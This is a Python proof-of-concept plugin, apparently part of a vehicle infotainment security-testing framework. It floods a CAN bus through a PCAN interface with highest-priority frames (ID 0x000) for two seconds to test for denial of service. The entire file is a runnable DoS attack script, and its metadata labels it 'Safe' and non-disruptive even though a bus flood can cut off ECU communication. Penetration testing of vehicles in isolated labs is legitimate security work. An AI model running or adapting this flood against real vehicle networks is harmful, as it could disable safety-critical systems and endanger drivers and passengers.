"""
PoC Name: CAN Bus DoS Flood
Identifier: CWE-400
Component: CAN Bus (PCAN)
Category: Protocol
Severity: High
CVSS: 7.5
Description: 通过高频发送高优先级CAN帧,测试总线是否存在拒绝服务风险。
Prerequisites: PCAN接口, python-can库, PCAN驱动, 隔离测试环境。
Usage: python3 03_CAN_DoS_Flood.py PCAN_USBBUS1
"""
import sys
import time
from iv_plugin_base import IVIVulnerabilityPlugin
from can_bus_utils import format_can_settings, get_can_settings, open_can_bus

class CANDoSFloodPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-CAN-003"
    meta_poc_name = "CAN DoS Flood"
    meta_cve_id = "CWE-400"
    meta_severity = "High"
    meta_protocol = "can"
    meta_target_os = ["all"]
    meta_required_params = ["can_interface"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"使用CAN接口: {format_can_settings(settings)}")
        return True

    def exploit(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"CAN DoS测试 ({format_can_settings(settings)}), 发送2秒高优先级帧...")
        try:
            import can
            bus = open_can_bus(self.params)
            flood_msg = can.Message(
                arbitration_id=0x000,  # Highest priority
                data=[0xFF]*8, is_extended_id=False
            )
            count = 0
            start = time.time()
            while time.time() - start < 2:
                bus.send(flood_msg)
                count += 1
            elapsed = time.time() - start
            rate = count / elapsed
            self.logger.warning(f"[+] 发送 {count} 帧 ({rate:.0f} fps)")
            self.logger.info("如果正常ECU通信被中断,则存在DoS风险")
            bus.shutdown()
            self.results["vulnerable"] = True
            self.results["evidence"] = f"Flood: {count} frames in {elapsed:.1f}s ({rate:.0f} fps)"
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"CAN DoS测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 03_CAN_DoS_Flood.py <can_interface>")
        sys.exit(1)
    plugin = CANDoSFloodPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
    plugin.run_verify()
